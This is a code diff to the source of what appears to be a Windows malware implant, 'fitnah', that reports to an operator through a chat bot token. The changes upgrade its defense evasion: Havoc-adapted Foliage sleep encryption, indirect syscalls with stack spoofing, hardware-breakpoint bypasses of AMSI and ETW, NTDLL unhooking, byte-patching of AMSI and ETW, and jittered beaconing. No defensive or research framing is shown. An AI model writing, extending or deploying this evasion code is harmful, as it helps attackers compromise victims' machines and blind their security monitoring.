@@ -38,7 +38,8 @@
 #include "src/bypass.h"
 #include "src/commands.h"
 
-extern VOID ObfuscatedSleep(DWORD dwMilliseconds);
+/* Upgraded evasion layer (Havoc-adapted) */
+#include "../fitnah/implant/implant.h"
 
 /* ── Compile-time agent config (set by -D flags) ─────────────────────────── */
 #ifndef FITNAH_BOT_TOKEN
@@ -74,7 +75,9 @@ static void sleep_jittered(void) {
     int hi    = g_sleep + delta;
     if (lo < 1) lo = 1;
     int ms = (lo + (rand() % (hi - lo + 1))) * 1000;
-    ObfuscatedSleep(ms);
+    /* FoliageSleep: RC4-encrypts image during sleep, decrypts on wake.
+       Falls back to plain Sleep() if FoliageInit() was not called. */
+    FoliageSleep((DWORD)ms);
 }
 
 /* ── Send a text message to the operator chat ────────────────────────────── */
@@ -346,15 +349,14 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         return 0;
     }
 
-    // 2. Initialize dynamic syscalls first to bypass hooks
-    extern BOOL Syscall_Initialize();
-    if (!Syscall_Initialize()) return 1;
+    // 2. Initialize indirect syscalls + stack spoof + Foliage + HwBp AMSI/ETW bypass
+    if (!ImplantInit()) return 1;
 
     // 3. Unhook NTDLL by reading a clean copy from disk
     extern BOOL UnhookNtdll();
     UnhookNtdll();
 
-    // 4. Patch AMSI + ETW using direct syscalls
+    // 4. Fallback byte-patch AMSI + ETW (belt-and-suspenders with HwBp)
     bypass_amsi();
     bypass_etw();
 
